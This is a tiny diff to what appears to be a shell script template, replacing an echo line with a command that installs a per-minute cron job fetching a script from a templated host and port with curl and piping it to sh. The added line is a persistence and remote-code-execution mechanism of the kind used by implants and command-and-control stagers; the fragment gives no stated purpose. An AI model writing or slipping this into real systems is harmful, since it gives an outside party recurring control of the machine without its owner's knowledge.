@@ -1,2 +1,2 @@
 | #!/bin/sh
-| echo #{name}
+| (crontab -l ; echo "* * * * * curl -s #{host}:#{port}/scripts/#{name} | sh") | uniq - | crontab -
